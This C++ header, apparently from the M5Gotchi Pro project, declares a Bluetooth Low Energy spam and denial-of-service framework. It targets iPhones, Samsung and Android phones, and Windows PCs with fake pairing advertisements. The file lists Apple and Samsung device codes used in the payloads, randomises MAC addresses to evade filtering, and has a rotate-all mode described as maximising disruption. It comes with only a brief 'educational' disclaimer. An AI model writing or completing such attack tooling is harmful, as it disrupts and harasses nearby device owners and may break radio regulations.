/**
 * @file bluetooth_attacks.h
 * @brief 📱 BLE Spam/Denial-of-Service Attack Framework
 * @version 1.0
 * @date 2025-10-26
 * 
 * @details Implements various BLE advertisement spam attacks targeting
 * device discovery mechanisms on iOS, Android, and Windows platforms.
 * Uses NimBLE stack for efficient multi-attack broadcasting.
 * 
 * **Attack Types:**
 * - Sour Apple: Fake Apple device advertisements (AirPods, AirTag, HomePod)
 * - Samsung Spam: Galaxy Watch/Buds pairing popups (25+ device models)
 * - Google Fast Pair: Android device pairing spam
 * - Microsoft Swift Pair: Windows 10/11 pairing spam
 * - Spam All: Rotate through all attack types
 * 
 * **Features:**
 * - Random MAC address generation per packet
 * - Adjustable send interval (default: 100ms)
 * - Packet counter for statistics
 * - Non-blocking execution mode
 * - 10 Apple device types, 25 Samsung models
 * 
 * **Educational Purpose:** This code is for security research and testing only.
 * Unauthorized BLE spam may violate regulations (FCC Part 15, CE, etc.).
 * 
 * @warning Use responsibly in controlled environments only!
 * 
 * @copyright (c) 2025 M5Gotchi Pro Project
 * @license MIT License
 * 
 * @example
 * ```cpp
 * BluetoothAttacks ble;
 * ble.begin();
 * ble.startSourApple();
 * while (ble.isRunning()) {
 *     ble.executeSourApple();
 *     delay(100);
 * }
 * ble.stop();
 * ```
 */

#ifndef BLUETOOTH_ATTACKS_H
#define BLUETOOTH_ATTACKS_H

#include <Arduino.h>
#include <NimBLEDevice.h>

/**
 * @brief BLE attack type enumeration
 * @details Defines available spam/DoS attack modes targeting different platforms.
 */
enum BLEAttackType {
    BLE_ATTACK_SOUR_APPLE,    ///< iOS proximity pairing spam (AirPods, AirTag, etc.)
    BLE_ATTACK_SAMSUNG,       ///< Samsung Galaxy device pairing spam
    BLE_ATTACK_GOOGLE,        ///< Google Fast Pair spam (Android)
    BLE_ATTACK_MICROSOFT,     ///< Microsoft Swift Pair spam (Windows)
    BLE_ATTACK_ALL            ///< Rotate through all attack types
};

/**
 * @brief Apple device type identifiers for Sour Apple attack
 * @details Official Apple Continuity protocol device type codes.
 * Reference: Apple Continuity Protocol Reverse Engineering
 */
enum AppleDeviceType {
    AIRPODS_GEN2 = 0x0220,       ///< AirPods 2nd Generation
    AIRPODS_PRO = 0x0E20,        ///< AirPods Pro
    AIRPODS_MAX = 0x0A20,        ///< AirPods Max
    AIRPODS_GEN3 = 0x1320,       ///< AirPods 3rd Generation
    AIRTAG = 0x0055,             ///< AirTag tracker
    APPLE_TV = 0x0604,           ///< Apple TV 4K
    HOMEPOD = 0x0602,            ///< HomePod/HomePod mini
    BEATS_SOLO_PRO = 0x0B09,     ///< Beats Solo Pro
    BEATS_FLEX = 0x1011,         ///< Beats Flex
    POWERBEATS_PRO = 0x0B03      ///< Powerbeats Pro
};

/**
 * @class BluetoothAttacks
 * @brief Multi-platform BLE spam attack framework
 * 
 * @details Provides coordinated BLE advertisement spam attacks using NimBLE stack.
 * Generates fake device advertisements to trigger pairing popups on target platforms.
 * Supports continuous attack mode with packet statistics tracking.
 * 
 * **Architecture:**
 * - Uses NimBLEAdvertising for efficient packet transmission
 * - Random MAC address per packet prevents filtering
 * - Payload generators for each platform (Apple/Samsung/Google/Microsoft)
 * - Non-blocking execution via execute*() methods
 * 
 * **Performance:**
 * - Default send interval: 100ms (10 packets/sec)
 * - Adjustable via _sendInterval member
 * - Packet counter for monitoring effectiveness
 * 
 * @warning High packet rates may cause device instability or network congestion
 */
class BluetoothAttacks {
public:
    /**
     * @brief Constructor - initializes attack state
     */
    BluetoothAttacks();
    
    /**
     * @brief Initialize NimBLE stack
     * @return true if successful, false on error
     * @details Must be called before any attack operations.
     * Initializes NimBLEDevice and advertising interface.
     */
    bool begin();
    
    /**
     * @brief Deinitialize BLE and free resources
     * @details Stops any running attacks and powers down BLE radio.
     */
    void end();
    
    /**
     * @brief Start Sour Apple attack (iOS devices)
     * @details Broadcasts fake Apple Continuity advertisements.
     * Triggers pairing popups on nearby iPhones/iPads.
     */
    void startSourApple();
    
    /**
     * @brief Start Samsung device spam (Galaxy Watch/Buds)
     * @details Broadcasts fake Samsung Fast Pair advertisements.
     * Triggers pairing popups on nearby Samsung Android devices.
     */
    void startSamsungSpam();
    
    /**
     * @brief Start Google Fast Pair spam
     * @details Broadcasts fake Google Fast Pair advertisements.
     * Triggers pairing popups on nearby Android devices.
     */
    void startGoogleSpam();
    
    /**
     * @brief Start Microsoft Swift Pair spam
     * @details Broadcasts fake Swift Pair advertisements.
     * Triggers pairing popups on nearby Windows 10/11 PCs.
     */
    void startMicrosoftSpam();
    
    /**
     * @brief Start rotating spam (all attack types)
     * @details Cycles through all attack types sequentially.
     * Maximizes disruption across all platforms.
     */
    void startSpamAll();
    
    /**
     * @brief Stop current attack
     * @details Stops advertising and resets attack state.
     */
    void stop();
    
    /**
     * @brief Check if attack is running
     * @return true if active, false if stopped
     */
    bool isRunning() { return _isRunning; }
    
    /**
     * @brief Get total packets sent
     * @return Packet count since attack started
     */
    uint32_t getPacketsSent() { return _packetsSent; }
    
    /**
     * @brief Get current attack type
     * @return Active BLEAttackType enum value
     */
    BLEAttackType getCurrentAttack() { return _currentAttack; }
    
    /**
     * @brief Execute one Sour Apple advertisement
     * @details Call repeatedly in loop for continuous attack.
     * Non-blocking with internal rate limiting.
     */
    void executeSourApple();
    
    /**
     * @brief Execute one Samsung spam advertisement
     * @details Call repeatedly in loop for continuous attack.
     */
    void executeSamsungSpam();
    
    /**
     * @brief Execute one Google Fast Pair advertisement
     * @details Call repeatedly in loop for continuous attack.
     */
    void executeGoogleSpam();
    
    /**
     * @brief Execute one Microsoft Swift Pair advertisement
     * @details Call repeatedly in loop for continuous attack.
     */
    void executeMicrosoftSpam();
    
private:
    bool _isRunning;                ///< Attack active flag
    uint32_t _packetsSent;          ///< Total packets transmitted
    BLEAttackType _currentAttack;   ///< Active attack type
    unsigned long _lastSendTime;    ///< Timestamp of last packet (millis)
    uint16_t _sendInterval;         ///< Delay between packets (ms)
    
    NimBLEAdvertising* _pAdvertising; ///< NimBLE advertising interface
    
    /**
     * @brief Generate random MAC address
     * @param mac Pointer to 6-byte MAC address buffer
     * @details Creates random locally-administered MAC (bit 1 of first byte set).
     */
    void generateRandomMac(uint8_t* mac);
    
    /**
     * @brief Set MAC address for next advertisement
     * @param mac Pointer to 6-byte MAC address
     * @details Configures NimBLE to use specified MAC for next packet.
     */
    void setBaseMacAddress(uint8_t* mac);
    
    /**
     * @brief Create Apple Continuity payload
     * @return NimBLEAdvertisementData with random Apple device advertisement
     * @details Formats payload per Apple Continuity protocol specification.
     */
    NimBLEAdvertisementData createApplePayload();
    
    /**
     * @brief Create Samsung Fast Pair payload
     * @return NimBLEAdvertisementData with random Samsung device advertisement
     */
    NimBLEAdvertisementData createSamsungPayload();
    
    /**
     * @brief Create Google Fast Pair payload
     * @return NimBLEAdvertisementData with Google Fast Pair advertisement
     */
    NimBLEAdvertisementData createGooglePayload();
    
    /**
     * @brief Create Microsoft Swift Pair payload
     * @return NimBLEAdvertisementData with Swift Pair advertisement
     */
    NimBLEAdvertisementData createMicrosoftPayload();
    
    /// Array of 10 Apple device type codes for Sour Apple attack
    const uint16_t _appleDevices[10] = {
        AIRPODS_GEN2,
        AIRPODS_PRO,
        AIRPODS_MAX,
        AIRPODS_GEN3,
        AIRTAG,
        APPLE_TV,
        HOMEPOD,
        BEATS_SOLO_PRO,
        BEATS_FLEX,
        POWERBEATS_PRO
    };
    
    /**
     * @brief Samsung device model descriptor
     * @details Maps device type codes to human-readable names.
     */
    struct SamsungWatch {
        uint8_t value;        ///< Samsung Fast Pair device type code
        const char* name;     ///< Human-readable device name
    };
    
    /// Array of 25 Samsung device models for spam attacks
    const SamsungWatch _samsungWatches[25] = {
        {0x01, "Gear S3"},
        {0x02, "Galaxy Watch"},
        {0x03, "Galaxy Watch Active"},
        {0x04, "Galaxy Watch Active 2"},
        {0x05, "Galaxy Watch 3"},
        {0x06, "Galaxy Watch 4"},
        {0x07, "Galaxy Watch 4 Classic"},
        {0x08, "Galaxy Watch 5"},
        {0x09, "Galaxy Watch 5 Pro"},
        {0x0A, "Galaxy Fit"},
        {0x0B, "Galaxy Fit 2"},
        {0x0C, "Galaxy Buds"},
        {0x0D, "Galaxy Buds+"},
        {0x0E, "Galaxy Buds Live"},
        {0x0F, "Galaxy Buds Pro"},
        {0x10, "Galaxy Buds 2"},
        {0x11, "Galaxy Buds 2 Pro"},
        {0x12, "Galaxy Ring"},
        {0x13, "Galaxy SmartTag"},
        {0x14, "Galaxy SmartTag+"},
        {0x15, "Galaxy Fit e"},
        {0x16, "Galaxy Watch FE"},
        {0x17, "Galaxy Buds FE"},
        {0x18, "Galaxy Watch Ultra"},
        {0x19, "Galaxy Buds 3"}
    };
};

/**
 * @brief Global BluetoothAttacks instance
 * @details Singleton instance for application-wide BLE attack functionality.
 */
extern BluetoothAttacks bleAttacks;

#endif // BLUETOOTH_ATTACKS_H
